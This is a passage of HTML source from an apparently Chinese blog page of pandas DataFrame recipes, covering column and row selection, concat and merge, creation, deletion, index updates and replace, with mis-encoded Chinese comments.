class="built_in">format</span>=<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br><span class="line"><span class="comment"># é€‰æ‹©æ—¥æœŸèŒƒå›´</span></span><br><span class="line">bz = [<span class="string">&#x27;2022-2-14&#x27;</span>,<span class="string">&#x27;2022-2-20&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="crud">CRUD</span></h2><p>ä¸€èˆ¬æ¥è¯´pandasæ“ä½œéƒ½ä¸ä¼šåœ¨åŸdataframeè¿›è¡Œä¿®æ”¹ï¼Œé€šè¿‡inplace&#x3D;Trueå¯ä»¥å®ç°å°±åœ°ä¿®æ”¹ã€‚</p><h4><span id="åˆ—æ“ä½œ">åˆ—æ“ä½œ</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å‘½åç‰¹å®šåˆ—å</span></span><br><span class="line">df.rename(columns=&#123;<span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;a&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># é‡å‘½åæ‰€æœ‰åˆ—å</span></span><br><span class="line">df.columns = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="comment"># å–å‡ºç‰¹å®šç±»å‹çš„åˆ—å</span></span><br><span class="line">obj_feature=df.dtypes[df.dtypes==<span class="string">&#x27;object&#x27;</span>].index</span><br><span class="line"><span class="comment"># æ›´æ–°åˆ—çš„ç±»å‹</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].astype(<span class="built_in">int</span>)</span><br><span class="line"><span class="comment"># æ’å…¥list</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">df.iat[i,-<span class="number">1</span>] = <span class="built_in">list</span>(xxx)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># è¿æ¥ä¸¤ä¸ªåˆ—</span></span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªå–ç»“æœçš„äº¤é›†</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªå–åŒ…å« df1 ç´¢å¼•çš„éƒ¨åˆ†</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line">pd.merge(df1,df4,left_index=<span class="literal">True</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢åˆ—</span></span><br><span class="line">df[<span class="string">&#x27;new col name&#x27;</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’å…¥åˆ—</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;æ˜¥èŠ‚æœŸé—´ï¼ˆé™¤å¤•è‡³åˆå…­ï¼‰ç”¨ç”µé‡&#x27;</span>]-df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>])/df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ df çš„ 7ã€8ã€9ã€10 åˆ—</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•°ã€é“¶ç‰Œæ•°ã€é“œç‰Œæ•° ä¸‰åˆ—</span></span><br><span class="line">df[[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“¶ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]]</span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"><span class="comment"># æ”¹å˜åˆ—é¡ºåº</span></span><br><span class="line">df = df[[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>]]</span><br><span class="line"><span class="comment"># å•ä¸€ä¸€åˆ—æå‰å¯ä»¥</span></span><br><span class="line">df.set_index(<span class="string">&#x27;a&#x27;</span>).reset_index()</span><br><span class="line"><span class="comment"># æŒ‰åˆ—æ’åº</span></span><br><span class="line">df.<span class="built_in">max</span>(axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">df.<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ç»Ÿè®¡å‡ºç°æœ€å¤šçš„</span></span><br><span class="line">tmp2 =df.groupby([<span class="string">&#x27;genreId&#x27;</span>]).agg(<span class="keyword">lambda</span> x:x.mode())</span><br><span class="line"><span class="comment"># æ–¹æ³•äºŒ</span></span><br><span class="line">df.groupby([<span class="string">&#x27;genreId&#x27;</span>,<span class="string">&#x27;contentRating&#x27;</span>]).count()[[<span class="string">&#x27;id&#x27;</span>]].idxmax(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="è¡Œæ“ä½œ">è¡Œæ“ä½œ</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ‹¼æ¥è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å«æœ‰ç©ºå€¼çš„è¡Œ</span></span><br><span class="line">df[df.isna().T.<span class="built_in">any</span>()]</span><br><span class="line"><span class="comment"># è¿æ¥ä¸¤ä¸ªdf</span></span><br><span class="line">pd.concat([train,val],ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df = pd.concat([train,val]).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ® key è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># æ ¹æ® key1 å’Œ key2 è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># æ ¹æ®leftçš„keyåˆ—å’Œrightçš„indexåˆå¹¶</span></span><br><span class="line">pd.merge(left1, right1, left_on=<span class="string">&#x27;key&#x27;</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how å¯ä»¥è®¾ç½®</span></span><br><span class="line"><span class="string">rightã€left: å·¦å¤–ï¼Œå³å¤–</span></span><br><span class="line"><span class="string">outerã€inner: å…¨å¤–è¿æ¥ï¼Œå†…è¿æ¥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># é‡æ–°äº§ç”Ÿæ•°æ®</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹¼æ¥ df1ã€df2ã€df3ï¼ŒåŒæ—¶æ–°å¢ä¸€ä¸ªç´¢å¼•ï¼ˆxã€yã€zï¼‰æ¥åŒºåˆ†ä¸åŒçš„è¡¨æ•°æ®æ¥æº</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’å…¥è¡Œ</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line">c = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">5</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">5</span>]&#125;)</span><br><span class="line">a = df.iloc[:<span class="number">2</span>,:]</span><br><span class="line">b = df.iloc[<span class="number">2</span>:,:]</span><br><span class="line">df = pd.concat([a,c,b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤ç¬¬ä¸€è¡Œ</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¡ä»¶åˆ é™¤</span></span><br><span class="line">df.drop(df[df.é‡‘ç‰Œæ•°&lt;<span class="number">20</span>].index)</span><br><span class="line">data =  data.drop(index = data[(data.ZH_Term_len == <span class="number">0</span>)].index.tolist())</span><br><span class="line"><span class="comment"># æå–å€’æ•°åä¸‰åˆ—çš„10-20è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;æ€»åˆ†&#x27;</span>:] </span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œ </span></span><br><span class="line"><span class="comment"># DataFrameæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Seriesæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œä¹‹åçš„å…¨éƒ¨è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># æå– 0-50 è¡Œï¼Œé—´éš”ä¸º 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•° ä¸ç­‰äº 10 çš„è¡Œ</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># æå–å¥‡æ•°è¡Œ</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># æå– ä¸­å›½ã€ç¾å›½ã€è‹±å›½ã€æ—¥æœ¬ã€å·´è¥¿ äº”è¡Œæ•°æ® ä¸” é‡‘ç‰Œæ•°å°äº30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;å›½å®¶å¥¥å§”ä¼š&#x27;</span>].isin([<span class="string">&#x27;ä¸­å›½&#x27;</span>,<span class="string">&#x27;ç¾å›½&#x27;</span>,<span class="string">&#x27;è‹±å›½&#x27;</span>,<span class="string">&#x27;æ—¥æœ¬&#x27;</span>,<span class="string">&#x27;å·´è¥¿&#x27;</span>]))]</span><br><span class="line"><span class="comment"># åŒ…å«æŸä¸ªå­—çš„è¡Œ</span></span><br><span class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå– ç¬¬ 0-2 è¡Œç¬¬ 0-2 åˆ—</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° + é“¶ç‰Œæ•° å¤§äº 15 çš„å›½å®¶</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° å¤§äº é‡‘ç‰Œå‡å€¼çš„å›½å®¶</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;é‡‘ç‰Œæ•° &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šä½ç½®æ’å…¥è¡Œ</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># è°ƒæ•´ é¡ºåº</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"><span class="comment"># å¯ä»¥è°ƒæ•´åˆ—çš„é¡ºåº</span></span><br><span class="line">ans.reindex([<span class="string">&#x27;installsæ€»æ•°&#x27;</span>,<span class="string">&#x27;contentRatingæœ€å¤šçš„ç±»å‹&#x27;</span>,<span class="string">&#x27;contentRatingæœ€å¤šç±»å‹ç™¾åˆ†æ¯”&#x27;</span>,<span class="string">&#x27;scoreå¹³å‡åˆ†&#x27;</span>],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¢é¡ºåº</span></span><br><span class="line">cpn_bz.iloc[[<span class="number">2</span>,<span class="number">3</span>]]=cpn_bz.iloc[[<span class="number">3</span>,<span class="number">2</span>]]</span><br></pre></td></tr></table></figure><h3><span id="create">Create</span></h3><ul><li>åˆ›å»ºDataFrame</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ list ç”Ÿæˆ</span></span><br><span class="line">nums = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>)]).reshape(<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line">colu = [<span class="string">f&#x27;col_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">inde = [<span class="string">f&#x27;row_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]  </span><br><span class="line">pd.DataFrame(data=nums,index=Finde,columns=colu)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ dict ç”Ÿæˆï¼Œç´¢å¼•è‡ªåŠ¨ç”Ÿæˆ</span></span><br><span class="line">hight = np.random.randint(<span class="number">158</span>,<span class="number">180</span>,<span class="number">10</span>)</span><br><span class="line">weight = np.random.randint(<span class="number">49</span>,<span class="number">75</span>,<span class="number">10</span>)</span><br><span class="line">pd.DataFrame(data=&#123;</span><br><span class="line">    <span class="string">&#x27;hight&#x27;</span>:hight,</span><br><span class="line">    <span class="string">&#x27;weight&#x27;</span>:weight,&#125;</span><br><span class="line">)      <span class="comment"># è¿™é‡Œæ²¡æœ‰è®¾ç½®ç´¢å¼•ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆ</span></span><br><span class="line"><span class="comment"># è¯»å–excel sheet_nameé»˜è®¤æ˜¯0ï¼Œä¼ å…¥æ•°å­—å°±æ˜¯è¯»å–ç¬¬x+1ä¸ªsheetï¼Œä¼ å…¥å­—ç¬¦ä¸²å°±æ˜¯æŸ¥æ‰¾å¯¹äºsheetçš„åå­—</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;data/2020å¹´é”€å”®æ•°æ®.xlsx&#x27;</span>,sheet_name=<span class="number">0</span>) </span><br><span class="line"><span class="comment"># è¯»å–csvæ–‡ä»¶ï¼Œé»˜è®¤ç¼–ç utf-8ï¼Œé‡åˆ°ä¸­æ–‡ä¹±ç å¯ä»¥è¯•è¯•çœ‹gbk</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data/2018å¹´åŒ—äº¬ç§¯åˆ†è½æˆ·æ•°æ®.csv&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>)  <span class="comment"># encodingå‚æ•°æŒ‡å®šæ•°æ®çš„ç¼–ç æ–¹å¼ä¸ºutf-8</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="del">Del</span></h3><ul><li><p>åˆ é™¤æŸåˆ—çš„æ•°æ®</p><ul><li><strong>axis</strong>ï¼šè½´ã€‚0 æˆ– â€˜indexâ€™ï¼Œè¡¨ç¤ºæŒ‰è¡Œåˆ é™¤ï¼›1æˆ–â€™columnsâ€™ï¼Œè¡¨ç¤ºæŒ‰åˆ—åˆ é™¤ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># del åªèƒ½åˆ ä¸€è¡Œ</span></span><br><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h3><span id="update">Update</span></h3><ul><li>whereæ“ä½œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœä¸€ä¸ªå›½å®¶çš„é‡‘ç‰Œæ•°å¤§äº 30 åˆ™å€¼ä¸º æ˜¯ï¼Œåä¹‹ä¸º å¦</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œå¤§äº30&#x27;</span>]  = np.where(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;æ˜¯&#x27;</span>, <span class="string">&#x27;å¦&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>æ›´æ–°ç´¢å¼•</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç´¢å¼•ä»1å¼€å§‹</span></span><br><span class="line">df.set_index(x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,df.shape[<span class="number">0</span>]+<span class="number">1</span>))</span><br><span class="line"><span class="comment"># ä½¿ç”¨æŸåˆ—ä½œä¸ºç´¢å¼•ï¼Œé»˜è®¤åˆ é™¤è¯¥åˆ— å³drop=True</span></span><br><span class="line">df.set_index(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line"><span class="comment"># ä¿®æ”¹ç´¢å¼•å å¦‚æœæ˜¯å¤šä¸ªç´¢å¼•å¯ä»¥é€šè¿‡[]ä¼ å…¥</span></span><br><span class="line">df.rename_axis(<span class="string">&#x27;æ—¥æœŸ&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šå¤šä¸ªç´¢å¼•</span></span><br><span class="line">df=df.set_index([<span class="string">&#x27;date&#x27;</span>,<span class="string">&#x27;val&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¿®æ”¹å•ä¸ªç´¢å¼•å</span></span><br><span class="line">df.rename_axis(index=&#123;<span class="string">&#x27;val&#x27;</span>:<span class="string">&#x27;v&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># è¿˜åŸç´¢å¼•ï¼Œä½¿ç”¨pandasç”Ÿæˆé»˜è®¤ç´¢å¼•</span></span><br><span class="line">df.reset_index()</span><br><span class="line"><span class="comment"># åˆ é™¤ç´¢å¼•</span></span><br><span class="line">df.reset_index(drop=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>replace</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†é‡‘ç‰Œæ•°åˆ—çš„æ•°å­— 0 æ›¿æ¢ä¸º æ— </span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;æ— &#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#åŒæ—¶æ›¿æ¢ 1å°† æ—  æ›¿æ¢ä¸º ç¼ºå¤±å€¼ 2å°† 0 æ›¿æ¢ä¸º None</span></span><br><span class="line">df.replace([<span class="string">&#x27;æ— &#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Seriesä¸­replaceå­—ç¬¦ä¸²éƒ¨åˆ†éœ€è¦åŠ ä¸Š.str. æ”¯æŒé“¾å¼ç¼–ç¨‹</span></span><br><span class="line">df.employmentLength.<span class="built_in">str</span>.replace(<span class="string">&#x27;years&#x27;</span>,<span class="string">&#x27;&#x27;</span>).<span class="built_in">str</span>.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda å’Œ str</span></span><br><span class="line">df.price = df.price.<span class="built_in">str</span>.replace(<span class="string">&#x27;[$|,]&#x27;</span>,<span class="string">&#x27;&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.price = df.price.apply(<span class="keyword">lambda</span> x:x.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)).astype(<span class="string">&#x27;float&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>fill</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill ä»åé¢å¾€å‰å¡«å……</span></span><br><span class="line"><span class="string">ffill ä»å‰å¾€å</span></span><br><span class="line"><span class="string">é»˜è®¤åˆ—æ–¹å‘å¡«å……0ï¼Œ1ä½¿ç”¨è¡Œæ–¹å‘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ 